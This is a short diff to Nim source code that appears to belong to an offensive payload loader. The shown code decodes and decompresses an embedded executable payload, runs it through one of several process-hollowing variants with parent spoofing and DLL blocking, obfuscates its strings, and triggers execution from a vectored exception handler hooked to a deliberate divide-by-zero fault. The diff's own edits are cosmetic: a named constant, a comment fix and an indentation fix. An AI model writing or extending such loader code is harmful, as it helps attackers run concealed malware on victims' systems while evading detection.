@@ -17,6 +17,9 @@ when defined(hollow1) or defined(hollow2) or defined(hollow3):
 when defined(hollow4) or defined(hollow5) or defined(hollow6):
     import hollow456
 
+const STATUS_INTEGER_DIVIDE_BY_ZERO = 0xC0000094
+
+
 # Raising VEH
 {.emit: """
 #include <windows.h>
@@ -48,12 +51,12 @@ proc execute(payload: string, sponsorCmd: string = getAppFilename(), isBlockDlls
     else:
         peStr = uncompress(decodedPayload)
 
-    # Check hollowsplitted args 
+    # Check hollow splitted args 
     when defined(hollow4) or defined(hollow5) or defined(hollow6):
         for i in commandLineParams:
             if i.startsWith(protectString("-A:")) or i.startsWith(protectString("-W:")) or i.startsWith(protectString("-T:")) or i.startsWith(protectString("-R:")):
                 # This is a worker process in splitted hollow, let it go
-                    return hollow456Worker(peStr)
+                return hollow456Worker(peStr)
         if not (protectString("-M") in commandLineParams):
             quit(1)
 
@@ -91,7 +94,7 @@ proc wrapExecute() =
 
 
 proc wrapExecuteVEH(pExceptInfo: PEXCEPTION_POINTERS): LONG =
-    if (pExceptInfo.ExceptionRecord.ExceptionCode == cast[DWORD](0xC0000094)): # STATUS_INTEGER_DIVIDE_BY_ZERO 
+    if (pExceptInfo.ExceptionRecord.ExceptionCode == cast[DWORD](STATUS_INTEGER_DIVIDE_BY_ZERO)): 
         wrap_execute()
     else:
         return EXCEPTION_CONTINUE_SEARCH
